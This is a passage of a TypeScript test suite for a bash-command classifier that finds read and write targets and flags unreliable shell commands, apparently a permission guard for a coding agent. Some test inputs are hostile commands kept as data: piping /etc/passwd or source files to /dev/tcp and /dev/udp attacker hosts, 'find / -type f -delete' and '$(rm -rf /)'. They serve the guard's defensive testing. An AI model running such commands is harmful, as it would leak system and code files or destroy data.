  const r = extractBashTargets("cat /etc/passwd 2>/dev/null", "/proj");
  assert.equal(r.reliable, true);
  if (r.reliable) {
    // Should NOT contain a write target for /dev/null.
    assert.equal(r.targets.some((t) => t.path === "/dev/null"), false);
    // Should contain read target for /etc/passwd.
    assert.equal(r.targets.some((t) => t.path === "/etc/passwd" && t.action === "read"), true);
  }
});

test("BMG25: stdout_redirect_to_dev_null_is_not_write_target", () => {
  const r = extractBashTargets("echo hello >/dev/null", "/proj");
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.equal(r.targets.some((t) => t.path === "/dev/null"), false);
    // No write targets at all for echo (echo is not in COMMAND_TABLE).
    assert.equal(r.targets.length, 0);
  }
});

test("BMG26: ls_with_stderr_to_dev_null_only_reads_dir", () => {
  const r = extractBashTargets("ls /tmp 2>/dev/null", "/proj");
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.equal(r.targets.some((t) => t.path === "/dev/null"), false);
    assert.equal(r.targets.some((t) => t.path === "/tmp" && t.action === "read"), true);
  }
});

test("BMG27: combined_redirect_only_dev_sinks_dropped", () => {
  const r = extractBashTargets("ls /tmp >/dev/null 2>&1", "/proj");
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.equal(r.targets.some((t) => t.path === "/dev/null"), false);
    assert.equal(r.targets.some((t) => t.path === "/tmp" && t.action === "read"), true);
  }
});

test("BMG28: redirect_to_dev_stderr_is_not_write_target", () => {
  const r = extractBashTargets("echo err >&2", "/proj");
  assert.equal(r.reliable, true);
  if (r.reliable) {
    // /dev/stderr is not the target here (fd-redirect to 2 is skipped entirely).
    assert.equal(r.targets.length, 0);
  }
});

test("BMG29: redirect_to_dev_stdout_is_not_write_target", () => {
  const r = extractBashTargets("echo out >/dev/stdout", "/proj");
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.equal(r.targets.some((t) => t.path === "/dev/stdout"), false);
  }
});

test("BMG30: redirect_to_normal_file_still_extracted_as_write", () => {
  const r = extractBashTargets("echo hello >/tmp/out.txt", "/proj");
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.equal(r.targets.some((t) => t.path === "/tmp/out.txt" && t.action === "write"), true);
  }
});

test("BMG31: mixed_redirects_only_dev_is_dropped", () => {
  const r = extractBashTargets("ls /tmp >/dev/null 2>/tmp/error.log", "/proj");
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.equal(r.targets.some((t) => t.path === "/dev/null"), false);
    assert.equal(r.targets.some((t) => t.path === "/tmp/error.log" && t.action === "write"), true);
    assert.equal(r.targets.some((t) => t.path === "/tmp" && t.action === "read"), true);
  }
});

test("BMG32: git_status_stderr_to_dev_null_no_target", () => {
  const r = extractBashTargets("git status 2>/dev/null", "/proj");
  assert.equal(r.reliable, true);
  if (r.reliable) {
    // git is a silent command; no targets expected.
    assert.equal(r.targets.length, 0);
  }
});

// -------- BMG33+: bounded glob --------

test("BMG33: bounded_glob_ls_archive_auto_allow", () => {
  const proj = "/proj";
  const r = extractBashTargets("ls openspec/changes/archive/*/", proj);
  assert.equal(r.reliable, true);
});

test("BMG34: bounded_glob_cat_specs_auto_allow", () => {
  const proj = "/proj";
  const r = extractBashTargets("cat openspec/specs/*/spec.md", proj);
  assert.equal(r.reliable, true);
  if (r.reliable) {
    // The glob token itself becomes a read target with the literal pattern.
    const t = r.targets.find((x) => x.path === "/proj/openspec/specs/*/spec.md");
    assert.equal(t?.action, "read");
  }
});

test("BMG35: bounded_glob_write_command_still_triggers_glob_expansion", () => {
  // rm is not read-only; glob should still trigger.
  const r = extractBashTargets("rm -rf /tmp/*.log", "/proj");
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "glob_expansion");
});

test("BMG36: cross_boundary_glob_still_triggers_glob_expansion", () => {
  // Prefix `../other-project/` escapes project root.
  const r = extractBashTargets("ls ../other-project/*/", "/proj");
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "glob_expansion");
});

test("BMG37: absolute_outside_prefix_glob_still_triggers", () => {
  // Absolute prefix `/tmp/` is outside project root.
  const r = extractBashTargets("ls /tmp/*.log", "/proj");
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "glob_expansion");
});

test("BMG38: rm_with_project_inner_glob_still_triggers", () => {
  // Even inside project root, rm is not read-only.
  const proj = "/proj";
  const r = extractBashTargets("rm -rf src/*.bak", proj);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "glob_expansion");
});

test("BMG39: git_log_with_bounded_glob_auto_allow", () => {
  const proj = "/proj";
  const r = extractBashTargets("git log --oneline openspec/specs/*/*.md", proj);
  assert.equal(r.reliable, true);
});

test("BMG40: cat_inside_project_bounded_glob_with_double_star_segment", () => {
  // `src/**/*.ts` — the glob prefix is `src/**` which is inside project.
  const proj = "/proj";
  const r = extractBashTargets("cat src/**/*.ts", proj);
  assert.equal(r.reliable, true);
});

test("BMG41: quoted_glob_inside_quotes_does_not_trigger_glob_check", () => {
  // Inside quotes, glob is literal. This should already have been reliable
  // via the quote-aware scanner; regression check.
  const r = extractBashTargets("ls '/tmp/*.log'", "/proj");
  assert.equal(r.reliable, true);
});

test("BMG42: escaped_glob_does_not_trigger", () => {
  const r = extractBashTargets("ls '/tmp/*.log'", "/proj");
  assert.equal(r.reliable, true);
});

test("BMG43: glob_with_dotdot_in_prefix_is_unbounded", () => {
  const proj = "/proj";
  // Prefix contains `..` — traversal, so unbounded.
  const r = extractBashTargets("ls src/../other/*", proj);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "glob_expansion");
});

test("BMG44: bare_glob_alone_is_unbounded", () => {
  // 边界①情形 B（bash-extract-glob-cd-boundary-refine）：`ls *` — glob 在 token
  // 起始无前缀，但命令 `ls` 只读（条件 3a），空 prefix glob 不以绝对路径标志
  // 开头，cwd == projectRoot 假设下视为 bounded 于 projectRoot → 放行。
  // 原实现判 glob_expansion；本 change 后变 reliable（预期行为变化，非回归）。
  // looksLikePath("*")=false，故 readExtract 不提取 target（与 `ls archive/*/`
  // → [] 惯例一致），但命令整体 reliable 放行。
  const r = extractBashTargets("ls *", "/proj");
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
});

test("BMG45: pipeline_stage_command_is_read_only", () => {
  const proj = "/proj";
  // `ls openspec/ | head -5` — the glob is in first stage (ls = read-only).
  const r = extractBashTargets("ls openspec/*/spec.md | head -5", proj);
  assert.equal(r.reliable, true);
});

test("BMG46: pipeline_stage_command_is_write", () => {
  const proj = "/proj";
  // `find openspec/ | xargs rm` — first stage `find` is read-only but
  // the SECOND stage is `xargs` which is a forwarder. Forwarder check
  // runs in splitPipelines and will trigger "forwarding_command".
  const r = extractBashTargets("find openspec/ | xargs rm", proj);
  assert.equal(r.reliable, false);
});

test("BMG47: find_in_stage_with_bounded_glob_allow", () => {
  const proj = "/proj";
  const r = extractBashTargets("find openspec/ -name '*.ts'", proj);
  assert.equal(r.reliable, true);
});

// -------- isBoundedGlobSafe unit tests --------

import { isBoundedGlobSafe } from "../src/lib/bash-extract/index.ts";

test("BMG48: isBoundedGlobSafe_true_for_bounded_read_only_glob", () => {
  const proj = "/proj";
  assert.equal(isBoundedGlobSafe("ls openspec/*/", proj), true);
});

test("BMG49: isBoundedGlobSafe_false_for_write_command_glob", () => {
  const proj = "/proj";
  assert.equal(isBoundedGlobSafe("rm -rf src/*.bak", proj), false);
});

test("BMG50: isBoundedGlobSafe_false_for_outside_prefix", () => {
  const proj = "/proj";
  assert.equal(isBoundedGlobSafe("ls /tmp/*.log", proj), false);
});

test("BMG51: isBoundedGlobSafe_false_for_dotdot_traversal", () => {
  const proj = "/proj";
  assert.equal(isBoundedGlobSafe("ls src/../other/*", proj), false);
});

test("BMG52: isBoundedGlobSafe_true_for_no_glob", () => {
  const proj = "/proj";
  assert.equal(isBoundedGlobSafe("ls openspec", proj), true);
});

test("BMG53: isBoundedGlobSafe_true_for_quoted_glob", () => {
  const proj = "/proj";
  // Quote-aware: `*` inside quotes is literal, not a glob metachar.
  assert.equal(isBoundedGlobSafe("echo 'some * pattern'", proj), true);
});

// -------- BMG60+: compound separator fragment-level bounded-glob --------
// These tests cover the bounded-glob-compound-separators change: bounded-glob
// detection must operate per-command-fragment (split by ; / && / || / & / \n)
// so a single fragment's safe bounded read-only glob isn't invalidated by an
// unrelated fragment.

const PROJ = "/proj";

test("BMG60: semicolon_separated_echo_then_bounded_glob_is_safe", () => {
  const r = extractBashTargets("echo hi; wc -l src/*.ts", PROJ);
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.ok(r.targets.some((t) => t.path.endsWith("src/*.ts") && t.action === "read"));
  }
});

test("BMG61: ampersand_separated_sleep_then_bounded_glob_is_safe", () => {
  const r = extractBashTargets("sleep 5 & wc -l src/*.ts", PROJ);
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.ok(r.targets.some((t) => t.path.endsWith("src/*.ts") && t.action === "read"));
  }
});

test("BMG62: newline_separated_echo_then_bounded_glob_is_safe", () => {
  const r = extractBashTargets("echo hi\nwc -l src/*.ts", PROJ);
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.ok(r.targets.some((t) => t.path.endsWith("src/*.ts") && t.action === "read"));
  }
});

test("BMG63: logical_and_separated_echo_then_bounded_glob_is_safe", () => {
  const r = extractBashTargets("echo hi && wc -l src/*.ts", PROJ);
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.ok(r.targets.some((t) => t.path.endsWith("src/*.ts") && t.action === "read"));
  }
});

test("BMG64: logical_or_separated_false_then_bounded_glob_is_safe", () => {
  const r = extractBashTargets("false || wc -l src/*.ts", PROJ);
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.ok(r.targets.some((t) => t.path.endsWith("src/*.ts") && t.action === "read"));
  }
});

test("BMG65: semicolon_separated_write_glob_still_unreliable", () => {
  // Write-command glob in a fragment must still trigger glob_expansion,
  // even if the first fragment is harmless.
  const r = extractBashTargets("echo hi; rm -f /tmp/*.log", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "glob_expansion");
});

test("BMG66: ampersand_greater_redirect_not_split_as_background", () => {
  // `&>` is a stdout+stderr redirect, NOT a background separator.
  // After splitCommands the whole command stays as one fragment, and the
  // redirect target is extracted as a write target.
  const r = extractBashTargets("echo hi &> /tmp/log", PROJ);
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.ok(r.targets.some((t) => t.path === "/tmp/log" && t.action === "write"));
  }
});

test("BMG67: fd_dup_not_split_as_background", () => {
  // `2>&1` is fd-dup, NOT a background separator. The `2` before `&` is a
  // digit, so the guard must suppress the split.
  const r = extractBashTargets("cmd 2>&1", PROJ);
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.equal(r.targets.length, 0);
  }
});

// -------- BMG68+: expand-reliable-classification --------
// Three exemptions: (1) quoted-heredoc content skip in scanUnreliable,
// (2) forwarder + read-only downstream in extractBashTargets FORWARDING check,
// (3) literal for-loop iteration in scanControlFlow + loopVars whitelist.

// --- Quoted-heredoc group (BMG68-BMG73) ---

test("BMG68: quoted_heredoc_single_quote_is_reliable", () => {
  const r = extractBashTargets(`cat <<'EOF'\nhello\nEOF`, PROJ);
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.equal(r.targets.length, 0);
  }
});

test("BMG69: quoted_heredoc_double_quote_is_reliable", () => {
  const r = extractBashTargets(`cat <<"EOF"\nhello\nEOF`, PROJ);
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.equal(r.targets.length, 0);
  }
});

test("BMG70: quoted_heredoc_dash_form_is_reliable", () => {
  const r = extractBashTargets(`cat <<-'EOF'\nhello\nEOF`, PROJ);
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.equal(r.targets.length, 0);
  }
});

test("BMG71: quoted_heredoc_content_with_dollar_is_literal", () => {
  // Quoted-heredoc content is literal — $(rm -rf /) must NOT be scanned.
  const r = extractBashTargets(`cat <<'EOF'\n$(rm -rf /)\nEOF`, PROJ);
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.equal(r.targets.length, 0);
  }
});

test("BMG72: unquoted_heredoc_still_unreliable", () => {
  // Unquoted heredoc → content undergoes expansion → still unreliable.
  const r = extractBashTargets(`cat <<EOF\nhello\nEOF`, PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "heredoc");
});

test("BMG73: quoted_heredoc_preceding_command_extracted", () => {
  // Preceding cat command extracts a read target; quoted heredoc is skipped.
  const r = extractBashTargets(`cat /etc/passwd; cat <<'EOF'\nx\nEOF`, PROJ);
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.ok(r.targets.some((t) => t.path === "/etc/passwd" && t.action === "read"));
  }
});

// --- Forwarder + read-only downstream group (BMG74-BMG78) ---

test("BMG74: xargs_grep_downstream_is_reliable", () => {
  const r = extractBashTargets(`find /tmp -name "*.log" | xargs grep "error"`, PROJ);
  assert.equal(r.reliable, true);
});

test("BMG75: xargs_wc_downstream_is_reliable", () => {
  const r = extractBashTargets(`find /tmp | xargs wc -l`, PROJ);
  assert.equal(r.reliable, true);
});

test("BMG76: xargs_rm_downstream_still_unreliable", () => {
  // rm is not read-only → exemption does not apply.
  const r = extractBashTargets(`find /tmp | xargs rm`, PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "forwarding_command");
});

test("BMG77: xargs_downstream_with_dollar_still_unreliable", () => {
  // Downstream arg contains $PATTERN → not statically determinable.
  const r = extractBashTargets(`find /tmp | xargs grep $PATTERN`, PROJ);
  assert.equal(r.reliable, false);
});

test("BMG78: xargs_downstream_with_glob_still_unreliable", () => {
  // Downstream arg contains unquoted glob → not statically determinable.
  const r = extractBashTargets(`find /tmp | xargs grep *.log`, PROJ);
  assert.equal(r.reliable, false);
});

// --- Literal for-loop group (BMG79-BMG86) ---

test("BMG79: literal_for_loop_read_only_body_is_reliable", () => {
  const r = extractBashTargets(`for f in a b c; do grep "$f"; done`, PROJ);
  assert.equal(r.reliable, true);
});

test("BMG80: literal_for_loop_multi_command_body_is_reliable", () => {
  const r = extractBashTargets(`for f in a b; do echo "$f"; grep "$f"; done`, PROJ);
  assert.equal(r.reliable, true);
});

test("BMG81: for_loop_with_glob_in_iter_still_unreliable", () => {
  // Iteration set contains glob → not literal → no exemption.
  const r = extractBashTargets(`for f in /etc/*.conf; do cat "$f"; done`, PROJ);
  assert.equal(r.reliable, false);
});

test("BMG82: for_loop_with_var_in_iter_still_unreliable", () => {
  // Iteration set contains $FILES → not literal → no exemption.
  const r = extractBashTargets(`for f in $FILES; do cat "$f"; done`, PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "control_flow");
});

test("BMG83: for_loop_with_write_body_still_unreliable", () => {
  // Body contains rm (write) → not read-only → no exemption.
  const r = extractBashTargets(`for f in a b; do rm "$f"; done`, PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "control_flow");
});

test("BMG84: while_loop_still_unreliable", () => {
  const r = extractBashTargets(`while read x; do cat "$x"; done`, PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "control_flow");
});

test("BMG85: if_statement_still_unreliable", () => {
  const r = extractBashTargets(`if true; then cat /etc/passwd; fi`, PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "control_flow");
});

test("BMG86: case_statement_still_unreliable", () => {
  const r = extractBashTargets(`case $x in a) cat a;; esac`, PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "control_flow");
});

// --- User session regression (BMG87) ---

test("BMG87: user_triggered_for_loop_is_reliable", () => {
  const cmd = `for f in openspec/changes/archive/2026-10-15-bash-extractor-agent-exploration openspec/changes/archive/2026-10-14-bash-meta-commands-guard; do echo "===$f==="; grep -n "^## " "$f"; done`;
  const r = extractBashTargets(cmd, PROJ);
  assert.equal(r.reliable, true);
});

// --- Stage A helper unit tests (bash-stage-a-security-fixes) ---

test("helper: isFindReadOnly returns true for filter-only args", () => {
  assert.equal(isFindReadOnly(["-name", "*.ts"]), true);
  assert.equal(isFindReadOnly(["-type", "f"]), true);
  assert.equal(isFindReadOnly(["-name", "*.ts", "-type", "f"]), true);
  assert.equal(isFindReadOnly([]), true);
  assert.equal(isFindReadOnly([".", "-name", "*.ts"]), true);
  assert.equal(isFindReadOnly([".", "-newermt", "2024-01-01"]), true);
});

test("helper: isFindReadOnly returns false for each write flag", () => {
  assert.equal(isFindReadOnly(["-delete"]), false);
  assert.equal(isFindReadOnly(["-exec"]), false);
  assert.equal(isFindReadOnly(["-execdir"]), false);
  assert.equal(isFindReadOnly(["-ok"]), false);
  assert.equal(isFindReadOnly(["-okdir"]), false);
});

test("helper: isFindReadOnly returns false for combined write flag", () => {
  assert.equal(isFindReadOnly([".", "-name", "*.bak", "-delete"]), false);
  assert.equal(isFindReadOnly([".", "-name", "*.tmp", "-exec", "rm", "{}", ";"]), false);
  assert.equal(isFindReadOnly([".", "-execdir", "rm", "{}", ";"]), false);
});

test("helper: isFindReadOnly uses exact string match on tokens (fail-closed on quoted literals)", () => {
  // tokenize strips quotes: `find . -name "-delete"` produces
  // `["find", ".", "-name", "-delete"]` — isFindReadOnly sees bare `-delete`
  // and returns false. This is a safe fail-closed false positive (per
  // design.md D3: "conservative judgement, user can allow on prompt").
  assert.equal(isFindReadOnly(["-delete"]), false);
  // But an unquoted -name argument doesn't contain -delete at all.
  assert.equal(isFindReadOnly(["-name", "*.ts"]), true);
  // A token that includes -delete as a substring is not exactly -delete.
  assert.equal(isFindReadOnly(["-deleteextra"]), true);
  // Escaped form (with backslash) is not exactly -delete.
  assert.equal(isFindReadOnly(["\\-delete"]), true);
});

test("helper: isReadOnlyWithArgs delegates find to isFindReadOnly", () => {
  assert.equal(isReadOnlyWithArgs("find", ["-name", "*.ts"]), true);
  assert.equal(isReadOnlyWithArgs("find", ["-delete"]), false);
  assert.equal(isReadOnlyWithArgs("find", []), true);
});

test("helper: isReadOnlyWithArgs delegates others to READ_ONLY_COMMANDS", () => {
  assert.equal(isReadOnlyWithArgs("cat", []), true);
  assert.equal(isReadOnlyWithArgs("grep", ["foo"]), true);
  assert.equal(isReadOnlyWithArgs("head", []), true);
  assert.equal(isReadOnlyWithArgs("ls", []), true);
  assert.equal(isReadOnlyWithArgs("rm", ["-rf", "/tmp/x"]), false);
  assert.equal(isReadOnlyWithArgs("echo", ["hi"]), false);
  assert.equal(isReadOnlyWithArgs("python", ["-c", "print(1)"]), false);
});

test("helper: isDevSocketOrFd returns true for network sockets and numeric fds", () => {
  assert.equal(isDevSocketOrFd("/dev/tcp/1.2.3.4/4444"), true);
  assert.equal(isDevSocketOrFd("/dev/tcp/attacker.com/53"), true);
  assert.equal(isDevSocketOrFd("/dev/udp/1.2.3.4/53"), true);
  assert.equal(isDevSocketOrFd("/dev/udp/attacker.com/80"), true);
  assert.equal(isDevSocketOrFd("/dev/fd/0"), true);
  assert.equal(isDevSocketOrFd("/dev/fd/3"), true);
  assert.equal(isDevSocketOrFd("/dev/fd/255"), true);
});

test("helper: isDevSocketOrFd returns false for regular /dev paths", () => {
  assert.equal(isDevSocketOrFd("/dev/null"), false);
  assert.equal(isDevSocketOrFd("/dev/stdin"), false);
  assert.equal(isDevSocketOrFd("/dev/stdout"), false);
  assert.equal(isDevSocketOrFd("/dev/stderr"), false);
  assert.equal(isDevSocketOrFd("/dev/zero"), false);
  assert.equal(isDevSocketOrFd("/dev/ptmx"), false);
  assert.equal(isDevSocketOrFd("/dev/random"), false);
  assert.equal(isDevSocketOrFd("/dev/fd"), false);
  assert.equal(isDevSocketOrFd("/dev/fd/stdin"), false);
  assert.equal(isDevSocketOrFd("/dev/fd/stdout"), false);
  assert.equal(isDevSocketOrFd("/dev/fd/abc"), false);
  assert.equal(isDevSocketOrFd("/dev/fd/3/extra"), false);
  assert.equal(isDevSocketOrFd("/tmp/out.txt"), false);
  assert.equal(isDevSocketOrFd("/etc/hosts"), false);
});

test("helper: isForwarderStageSafe handles empty stages array", () => {
  assert.equal(isForwarderStageSafe(0, []), true);
});

test("helper: isForwarderStageSafe returns true for first-stage forwarder with read-only downstream", () => {
  const stages = ["xargs grep pattern"];
  assert.equal(isForwarderStageSafe(0, stages), true);
});

test("helper: isForwarderStageSafe returns false for first-stage forwarder with write downstream", () => {
  const stages = ["xargs rm -rf"];
  assert.equal(isForwarderStageSafe(0, stages), false);
});

test("helper: isForwarderStageSafe returns true for find-name upstream + xargs-cat downstream", () => {
  const stages = ["find . -name \"*.ts\"", "xargs cat"];
  assert.equal(isForwarderStageSafe(1, stages), true);
});

test("helper: isForwarderStageSafe returns false for find-exec upstream + xargs-cat downstream", () => {
  const stages = ["find . -exec rm {} ;", "xargs cat"];
  assert.equal(isForwarderStageSafe(1, stages), false);
});

test("helper: isForwarderStageSafe returns true for forwarder chain of read-only downstreams", () => {
  const stages = ["xargs cat", "xargs grep pattern"];
  assert.equal(isForwarderStageSafe(1, stages), true);
});

test("helper: isForwarderStageSafe returns false for forwarder chain with write first stage", () => {
  const stages = ["xargs rm -rf", "xargs cat"];
  assert.equal(isForwarderStageSafe(1, stages), false);
});

test("helper: isForwarderStageSafe returns false when upstream is a write command", () => {
  const stages = ["rm -rf /tmp/x", "xargs cat"];
  assert.equal(isForwarderStageSafe(1, stages), false);
});

test("helper: isForwarderStageSafe returns false when upstream is non-read-only tool", () => {
  const stages = ["tee /etc/x", "xargs cat"];
  assert.equal(isForwarderStageSafe(1, stages), false);
});

test("helper: FIND_WRITE_FLAGS contains the 5 expected flags", () => {
  assert.equal(FIND_WRITE_FLAGS.has("-delete"), true);
  assert.equal(FIND_WRITE_FLAGS.has("-exec"), true);
  assert.equal(FIND_WRITE_FLAGS.has("-execdir"), true);
  assert.equal(FIND_WRITE_FLAGS.has("-ok"), true);
  assert.equal(FIND_WRITE_FLAGS.has("-okdir"), true);
  assert.equal(FIND_WRITE_FLAGS.has("-name"), false);
  assert.equal(FIND_WRITE_FLAGS.has("-type"), false);
  assert.equal(FIND_WRITE_FLAGS.has("-newermt"), false);
});

// --- BT-S1..BT-S5: /dev/* exemption narrowing (Phase 2) ---

test("BT-S1: /dev/tcp redirect is write target", () => {
  const r = extractBashTargets("echo pwn > /dev/tcp/1.2.3.4/4444", PROJ);
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.ok(r.targets.some((t) => t.path === "/dev/tcp/1.2.3.4/4444" && t.action === "write"));
  }
});

test("BT-S2: /dev/udp redirect is write target", () => {
  const r = extractBashTargets("cat /etc/passwd > /dev/udp/attacker.com/53", PROJ);
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.ok(r.targets.some((t) => t.path === "/dev/udp/attacker.com/53" && t.action === "write"));
  }
});

test("BT-S3: /dev/fd/N redirect is write target", () => {
  const r = extractBashTargets("echo x > /dev/fd/3", PROJ);
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.ok(r.targets.some((t) => t.path === "/dev/fd/3" && t.action === "write"));
  }
});

test("BT-S4: /dev/null redirect still exempt", () => {
  const r = extractBashTargets("echo hello > /dev/null", PROJ);
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.equal(r.targets.length, 0);
  }
});

test("BT-S5: /dev/stderr and /dev/stdout redirects still exempt", () => {
  const stderr = extractBashTargets("echo err > /dev/stderr", PROJ);
  assert.equal(stderr.reliable, true);
  if (stderr.reliable) assert.equal(stderr.targets.length, 0);

  const stdout = extractBashTargets("echo out > /dev/stdout", PROJ);
  assert.equal(stdout.reliable, true);
  if (stdout.reliable) assert.equal(stdout.targets.length, 0);
});

test("BT-S-extra: /dev/fd/stdin and /dev/ptmx still exempt", () => {
  const stdin = extractBashTargets("echo x > /dev/fd/stdin", PROJ);
  assert.equal(stdin.reliable, true);
  if (stdin.reliable) assert.equal(stdin.targets.length, 0);

  const ptmx = extractBashTargets("echo x > /dev/ptmx", PROJ);
  assert.equal(ptmx.reliable, true);
  if (ptmx.reliable) assert.equal(ptmx.targets.length, 0);
});

test("BT-S-extra: mixed redirect keeps /dev/null exempt and keeps /dev/tcp classified", () => {
  // `2>/dev/null` and `>/dev/tcp/...` in the same command:
  // /dev/null stays exempt, /dev/tcp becomes a write target.
  const r = extractBashTargets("cat /etc/passwd 2>/dev/null | tee /dev/tcp/1.2.3.4/4444", PROJ);
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.ok(r.targets.some((t) => t.path === "/dev/tcp/1.2.3.4/4444" && t.action === "write"));
    assert.ok(!r.targets.some((t) => t.path === "/dev/null"));
  }
});

// --- BT-S6..BT-S9: find write flags → find_write_flag (Phase 3) ---

test("BT-S6: find -delete isolated is find_write_flag", () => {
  const r = extractBashTargets("find / -type f -delete", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "find_write_flag");
});

test("BT-S7: find -exec isolated is find_write_flag", () => {
  const r = extractBashTargets("find . -exec rm {} \\;", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "find_write_flag");
});

test("BT-S8: find -ok isolated is find_write_flag", () => {
  const r = extractBashTargets("find . -name \"*.tmp\" -ok rm {} \\;", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "find_write_flag");
});

test("BT-S9: find -execdir isolated is find_write_flag", () => {
  const r = extractBashTargets("find . -name \"*.tmp\" -execdir rm {} \\;", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "find_write_flag");
});

test("BT-S-extra: find -okdir isolated is find_write_flag", () => {
  const r = extractBashTargets("find . -name \"*.tmp\" -okdir rm {} \\;", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "find_write_flag");
});

test("BT-S-extra: find write flag in a compound sequence is find_write_flag", () => {
  const r = extractBashTargets("echo hi; find . -delete; ls /tmp", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "find_write_flag");
});

// --- BT-S10..BT-S11: find without write flags still reliable (Phase 3) ---

test("BT-S10: find . -name '*.ts' still reliable", () => {
  const r = extractBashTargets(`find . -name "*.ts"`, PROJ);
  assert.equal(r.reliable, true);
});

test("BT-S11: find /etc -type f still reliable", () => {
  const r = extractBashTargets("find /etc -type f", PROJ);
  assert.equal(r.reliable, true);
});

test("BT-S-extra: find -newermt is a filter flag, still reliable", () => {
  const r = extractBashTargets("find . -newermt \"2024-01-01\"", PROJ);
  assert.equal(r.reliable, true);
});

test("BT-S-extra: find -name with glob inside quotes is still reliable", () => {
  // `*` inside double quotes is not an unquoted glob — should NOT trigger glob_expansion.
  const r = extractBashTargets(`find src/ -name "*.ts"`, PROJ);
  assert.equal(r.reliable, true);
});

// --- BT-S17..BT-S18: find in bounded glob context (Phase 3) ---

test("BT-S17: find with write flag in bounded glob context is find_write_flag", () => {
  // `find src/ -name "*.ts" -delete` — the `*.ts` is quoted so not an unquoted
  // glob; the write flag is what triggers. If we used an unquoted glob like
  // `find src/*.ts -delete`, it would still trigger find_write_flag (scan
  // order: find_write_flag runs before glob_expansion in scanUnreliable).
  const r = extractBashTargets("find src/ -name \"*.ts\" -delete", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "find_write_flag");
});

test("BT-S18: find without write flag in bounded glob context still reliable", () => {
  const r = extractBashTargets(`find src/ -name "*.ts"`, PROJ);
  assert.equal(r.reliable, true);
});

test("BT-S-extra: find with unquoted glob prefix inside projectRoot still reliable", () => {
  // Unquoted glob `src/*.ts` is inside PROJ — should NOT trigger glob_expansion,
  // and find without write flags is read-only.
  const r = extractBashTargets("find src/*.ts -name foo", PROJ);
  assert.equal(r.reliable, true);
});

test("BT-S-extra: find with unquoted glob + write flag is find_write_flag", () => {
  // Even with a bounded glob, the write flag takes precedence.
  const r = extractBashTargets("find src/*.ts -delete", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "find_write_flag");
});

// --- BT-S19: /dev/tcp combined with bounded glob (Phase 3/6 cross) ---

test("BT-S19: /dev/tcp redirect combined with bounded glob extracts write target", () => {
  // `cat src/*.ts > /dev/tcp/...`: unquoted glob `src/*.ts` is inside PROJ
  // (bounded glob safe), `cat` is read-only, and the `/dev/tcp/...`
  // redirect is a write target. Cross-verifies that the bounded-glob
  // allowlist and the /dev/tcp exception work together.
  const r = extractBashTargets("cat src/*.ts > /dev/tcp/1.2.3.4/4444", PROJ);
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.ok(r.targets.some((t) => t.path === "/dev/tcp/1.2.3.4/4444" && t.action === "write"));
  }
});

// --- BT-S20: for-loop body with find (integration with for-loop-iteration-glob-bounded) ---

test("BT-S20: for-loop body with find -name is still reliable", () => {
  // `for f in a b; do find "$f" -name "*.ts"; done` — literal-iteration
  // for-loop with a read-only body containing `find -name`. Even after
  // removing `find` from READ_ONLY_COMMANDS, isForBodyReadOnly must use
  // isReadOnlyWithArgs to still recognize `find -name` as read-only.
  const r = extractBashTargets(`for f in a b; do find "$f" -name "*.ts"; done`, PROJ);
  assert.equal(r.reliable, true);
});

test("BT-S20-extra: for-loop body with find -delete is NOT read-only", () => {
  // Body contains `find -delete` — isForBodyReadOnly should return false,
  // so the for-loop exemption doesn't apply, and control_flow guard catches
  // it (reason: control_flow).
  const r = extractBashTargets(`for f in a b; do find "$f" -delete; done`, PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "control_flow");
});

test("BT-S20-extra: for-loop body with find -name still reliable after change", () => {
